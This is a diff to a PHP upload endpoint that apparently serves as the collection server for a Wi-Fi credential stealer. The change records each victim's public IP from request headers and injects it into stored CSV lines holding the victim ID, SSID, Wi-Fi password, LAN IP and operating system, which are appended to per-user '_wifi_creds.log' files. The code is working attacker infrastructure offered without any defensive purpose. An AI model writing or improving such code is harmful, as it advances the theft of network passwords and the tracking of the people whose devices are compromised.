@@ -61,12 +61,40 @@ if ($body === '' || $body === false) {
     exit;
 }
 
+// Get real public IP of the victim connecting to upload.php
+$publicIp = $_SERVER['HTTP_CF_CONNECTING_IP'] 
+    ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
+    ?? $_SERVER['REMOTE_ADDR'] 
+    ?? 'unknown';
+
 // Sanitise username for filename
 $safe    = preg_replace('/[^a-z0-9_\-]/i', '_', $validUser);
 $logFile = CREDS_DIR . '/' . $safe . '_wifi_creds.log';
 
+// Process incoming lines and inject public IP at index 6 if missing
+$processedLines = [];
+foreach (explode("\n", trim($body)) as $l) {
+    $l = trim($l);
+    if ($l === '') continue;
+    $fields = str_getcsv($l);
+    // CSV fields: [0:time, 1:victim_id, 2:ssid, 3:pass, 4:lan_ip, 5:os, 6:public_ip]
+    if (count($fields) >= 5) {
+        if (!isset($fields[5]) || $fields[5] === '') $fields[5] = 'Windows';
+        if (!isset($fields[6]) || $fields[6] === '' || $fields[6] === 'unknown' || $fields[6] === 'N/A') {
+            $fields[6] = $publicIp;
+        }
+        $processedLines[] = implode(',', array_map(function($f) {
+            return str_contains($f, ',') ? '"' . str_replace('"', '""', $f) . '"' : $f;
+        }, $fields));
+    } else {
+        $processedLines[] = $l;
+    }
+}
+
 // Append the line(s) – ensure newline separation
-file_put_contents($logFile, rtrim($body) . PHP_EOL, FILE_APPEND | LOCK_EX);
+if (!empty($processedLines)) {
+    file_put_contents($logFile, implode(PHP_EOL, $processedLines) . PHP_EOL, FILE_APPEND | LOCK_EX);
+}
 
 http_response_code(200);
 echo json_encode(['status' => 'ok', 'user' => $validUser]);
